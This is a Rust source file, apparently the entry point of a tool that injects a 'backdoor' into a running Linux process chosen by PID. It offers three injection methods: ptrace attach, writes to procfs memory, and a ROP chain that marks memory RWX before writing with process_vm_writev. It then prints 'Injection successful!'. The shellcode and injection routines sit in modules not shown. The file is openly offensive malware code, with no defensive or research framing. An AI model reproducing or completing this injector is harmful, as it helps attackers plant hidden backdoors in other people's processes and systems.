use clap::Parser;
use libc::pid_t;

mod asm;
mod constants;

mod procfs;
mod ptrace;
mod syscall;

#[derive(clap::Parser)]
enum Cli {
    // Attach to the process via ptrace and inject the hook
    Ptrace { pid: pid_t },
    // Write to the process memory via procfs
    Procfs { pid: pid_t },
    // ROP the process to mprotect the payload locations as RWX and write to it. Uses process_vm_writev syscall
    Syscall { pid: pid_t },
}

fn main() {
    // Interpret the asm code as byte slices
    // ASM that jumps to the backdoor
    let hook_payload = unsafe {
        std::slice::from_raw_parts(
            asm::hook_start as *const u8,
            asm::payload_start as *const u8 as usize - asm::hook_start as *const u8 as usize,
        )
    };

    // The code of the backdoor itself
    let mut payload = unsafe {
        std::slice::from_raw_parts(
            asm::payload_start as *const u8,
            asm::stack_shellcode_start as *const u8 as usize
                - asm::payload_start as *const u8 as usize,
        )
    };

    match Cli::parse() {
        Cli::Ptrace { pid } => {
            ptrace::inject(pid, &hook_payload, &payload);
        }
        Cli::Procfs { pid } => {
            procfs::inject(pid, &hook_payload, &mut payload);
        }
        Cli::Syscall { pid } => {
            syscall::inject(pid, &hook_payload, &mut payload);
        }
    }

    println!("Injection successful!");
}
